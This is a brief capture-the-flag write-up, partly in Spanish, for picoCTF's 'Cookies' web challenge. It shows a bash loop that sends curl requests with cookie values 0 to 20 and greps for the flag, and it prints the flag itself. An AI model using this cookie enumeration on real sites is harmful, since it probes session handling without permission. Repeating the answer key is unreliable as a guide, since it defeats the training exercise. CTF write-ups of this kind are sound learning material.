

### Descripcion

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:17781/](http://mercury.picoctf.net:17781/)

### Solucion

```

iTheGuiller-picoctf@webshell:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:17781/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>
iTheGuiller-picoctf@webshell:~$ 



Se utilizo el comando para buscar la flag en el codigo de cada cookie

```

### Notas



## Referencias